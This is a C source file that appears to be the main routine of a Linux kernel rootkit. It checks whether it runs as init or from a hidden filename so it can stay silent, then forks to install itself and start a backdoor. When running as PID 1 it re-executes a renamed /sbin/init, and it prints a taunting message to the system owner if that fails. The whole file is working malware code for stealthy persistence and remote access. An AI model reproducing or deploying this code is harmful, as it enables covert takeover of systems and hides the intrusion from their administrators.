/*
 * $Id: the main sk stuff
 */

#include "stuff.h"

int	silent = 0;	/* silent flag - when installing from init or such */

int main(int argc, char *argv[], char *envp[]);

/* libc emulation */
void	_start(char *argv, ...)
{
        int     i = 0;
	char	*p;
        va_list ap;

        va_start(ap, argv);
        do {
                i++;
                p = va_arg(ap, char *);
        } while (p);

	_exit(main(i, &argv, (void *) ap));
}


/* this is our main() entry */
int main(int argc, char *argv[], char *envp[])
{
	int i, ret = 0;

	/* test whether we should shut up
	   thats possible in two cases - when invoked as "init" or invoked
	   from hidden file name */
	if ((getpid() == 1) ||
	    (!strcmp((argv[0] + strlen(argv[0]) - (sizeof(HIDESTR)-1)),
	     HIDESTR)))
		silent = 1;

	printf("%s\n", BANNER);

	i = fork();
	if (!i) {
		if (installed()) {
			ret = client(argc, argv);
			return 0;
		}
		if (install())
			return 1;
		if (backdoor_init())
			return 1;
		return 0;
	}
	waitpid(i, &ret, 0);

	/* segv ? */
	if (ret & 0x7f) {
		/* huh-huh, could be done with setrlimit too, but ... ;P */
		unlink("core");
		printf("\nFUCK: Got signal %d while manipulating kernel!\n", ret & 0x7f);
	}

	ret = (ret & 0xff00) >> 8;

	if (getpid() == 1) {
		sk_io	b;
		skio(CMD_COMMHACK, &b);
		ret = execve("/sbin/init" HIDESTR, argv, envp);
		if (ret < 0) {
/* lame-mode enabled, why not to do some fun when the worst happens ?! :) */
#if BE_LAME
			silent = 0;
			printf( "%s\n\n"
				"_ __/|\n"
				"\\'X.X'\n"
				"=(___)=\n"
				"    U\n", BANNER);
			printf(
				"\nHello, dear friend\n"
				"I have two news for you. Bad one and the bad one:\n"
				"First, it seems that someone installed rootkit\n"
				"on your system...\n"
				"Second, is the fact that I can't execute (errno=%d)\n"
				"original /sbin/init binary!\n"
				"And reason why I am telling you this is\n"
				"that I can't live without this file. It's just\n"
				"kinda of symbiosis, so, boot from clean floppy,\n"
				"mount root fs and repair /sbin/init from backup.\n\n"
				"(and install me again, if you like :P)\n\n"
				"Best regards,\n"
				"\tyour rootkit .. Have a nice day!\n\n", -ret);
#endif
			/* sit and relax! */
			while (1) { };
		}
	}
	return ret;
}
